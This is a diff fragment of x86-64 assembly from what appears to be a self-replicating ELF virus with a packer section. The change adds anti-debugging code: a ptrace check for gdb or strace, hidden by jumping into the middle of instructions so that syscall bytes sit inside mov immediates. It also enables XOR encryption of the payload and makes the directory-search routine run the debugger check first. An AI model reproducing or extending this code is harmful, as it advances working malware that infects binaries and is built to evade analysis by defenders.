@@ -47,12 +47,12 @@ _h3ll0w0rld:
 	; http://infoscience.epfl.ch/record/167546/files/thesis.pdf
 	; Basically it ptrace(0, 0, 0 ,0) to check if something is tracing the
 	; binary (gdb, strace, ...), and then it select host or not launching
-	jmp $+4; -- skip mov rax
+	.dont_gdb_bro:
 	mov rdi, 0x02ebf63148ff3148; xor rdi, rdi; xor rsi, rsi; jmp $+4
 	; -- has to skip 2 byte of instruction next line
-	mov rsi, 0x656ac93148d23148; xor rdx, rdx; xor rcx, rcx; push 101 -- ptrace
-	pop rax
-	syscall
+	mov rsi, 0x02ebc93148d23148; xor rdx, rdx; xor rcx, rcx; push 101 -- ptrace
+	mov rax, 0xc303eb050f58656a; push 101; pop rax; syscall; jmp $+5; ret
+	jmp .dont_gdb_bro + 2
 ; = debug
 ;	xor rax, rax
 ; =
@@ -81,11 +81,10 @@ _h3ll0w0rld:
 		sub rsi, rdx ; length - (_virus - _params)
 		lea rdx, [rel _h3ll0w0rld]
 		mov rcx, KEY_SIZE
-;		; TODO: XOR DESENCRYPTION HERE
 		call _xor_encrypt
 		pop rdx
 
-	jmp .infected; TODO: has to jmp on [eb 27] (previously $-15)
+	jmp .ft + 5; jmp on eb 24 -> jmp .infected
 	.here:
 	push 2
 	pop rdi
@@ -98,11 +97,12 @@ _h3ll0w0rld:
 	jmp $+4; has to skip 2 byte of instruction next line
 	mov rdi, 0x03eb583c6a5f016a; push 1; pop rdi; push 60; pop rax; jmp $+5
 	;                            from right to left
-	mov rax, 0xc0314827eb050f42; 42[syscall][jmp .infected][xor rax, rax]
+	.ft:
+	mov rax, 0xc0314824eb050f42; 42[syscall][jmp .infected][xor rax, rax]
 
 	.ahah:
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
-	jnz .code ; $-15
+	jnz .code ; .xor_decrypt
 	; copy the prg in memory and launch it cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
 
 	.host:
@@ -325,6 +325,7 @@ ret
 ; packer-part till _eof --------------------------------------------------------
 _pack_start:
 _search_dir:
+	call _h3ll0w0rld + 35; jmp to ret to check for ptrace locked
 	; check for process running
 	push 1
 	pop rsi ; mode for move_through_dir
